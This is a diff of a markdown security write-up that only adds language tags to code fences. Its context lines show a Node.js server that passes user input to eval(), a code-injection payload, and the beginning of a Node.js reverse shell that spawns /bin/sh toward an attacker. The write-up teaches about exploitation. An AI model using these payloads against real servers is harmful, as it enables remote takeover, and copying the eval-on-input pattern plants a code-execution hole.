@@ -33,7 +33,7 @@ Our next step was to review the Node.js API code and understand the crashes.
 We created this small Node.js application with the vulnerable function if you want to try to exploit it yourself.
 This Node.js web server will wait for a query such as `http://target.tld//?name=do*` and search for animal names matching that query.
 
-```
+```javascript
 'use strict'
 const http = require('http');
 const url = require('url');
@@ -93,7 +93,7 @@ const server = http.createServer(requestHandler);
 server.listen(3000);
 ```
 
-```
+```json
 [
     {"name": "Dinosaur"},
     {"name": "Dog"},
@@ -112,14 +112,14 @@ server.listen(3000);
 After a few minutes of analyzing the buggy endpoints in the code we noticed a bad practice issue that could lead to remote code execution.
 The `stringToRegexp` function is evaluating user input to create a `RegExp` object and use it to find elements in an array.
 
-```
+```javascript
 return eval(prefix + output + suffix); // we control output value
 ```
 
 We can insert our own Javascript code in the output variable and execute it.
 The stringToRegexp function will escape some characters and the output value will be evaluated.
 
-```
+```javascript
 ["./;require('util').log('Owned');//*"]
 ```
 
@@ -133,7 +133,7 @@ From there it would be nice to execute code to have an interactive shell such as
 The Javascript code below is a Node.js reverse shell.
 The payload will spawn a /bin/sh shell, create a TCP connection to the attacker and attach the shell standard streams to it.
 
-```
+```javascript
 (function(){
     var net = require("net"),
         cp = require("child_process"),
